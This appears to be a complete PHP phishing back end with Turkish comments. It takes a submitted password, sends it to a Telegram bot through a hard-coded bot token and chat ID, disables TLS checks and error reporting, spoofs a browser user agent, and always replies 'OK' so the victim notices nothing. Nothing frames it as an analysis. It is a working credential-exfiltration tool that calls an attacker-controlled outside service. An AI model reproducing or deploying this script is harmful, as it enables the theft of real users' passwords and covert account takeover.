<?php
// Hata raporlamayı tamamen kapat
error_reporting(0);

// Password'u al
$password = $_REQUEST['password'] ?? '';

if(!empty($password)) {
    $token = "7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM";
    $chat_id = "5587800563";
    
    // Mesajı hazırla
    $text = "🔐 Password: " . $password;
    
    // URL'yi hazırla
    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($text);
    
    // cURL ile gönder (en güvenilir yöntem)
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Her durumda OK dön
    echo "OK";
    exit;
}

echo "OK"; // Hata durumunda bile OK dön
?>